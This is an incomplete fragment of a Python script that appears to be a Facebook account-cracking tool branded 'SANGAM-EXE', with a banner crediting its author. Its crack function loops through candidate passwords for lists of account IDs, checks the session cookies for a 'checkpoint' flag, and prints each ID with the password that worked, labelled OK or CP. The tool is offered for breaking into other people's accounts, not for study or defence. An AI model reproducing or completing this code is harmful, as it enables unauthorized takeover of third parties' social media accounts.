...
\033[1;37m----------------------------------------------
 ...
 FACEBOOK   : Sangam Don
 DECODE BY  : SANGAM
\033[1;37m----𝗩𝗔𝗚𝗬𝗔 𝗥𝗔𝗠𝗥𝗢 𝗥𝗔𝗜𝗫𝗔 𝗦𝗔𝗡𝗚𝗔𝗠 𝗞𝗢 𝗖𝗠𝗗 𝗨𝗦𝗘 𝗚𝗔𝗥𝗡𝗔 𝗣𝗔𝗜𝗦-""")
def banner():
	print(logo)
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r {P}[SANGAM-EXE]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	...
	for pw in pwv:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r{P}{K} [SANGAM-CP] {idf} │ {pw} {P}')
				...
				print(f'\r{P}{H} [SANGAM-OK] {idf} │ {pw} {P}')
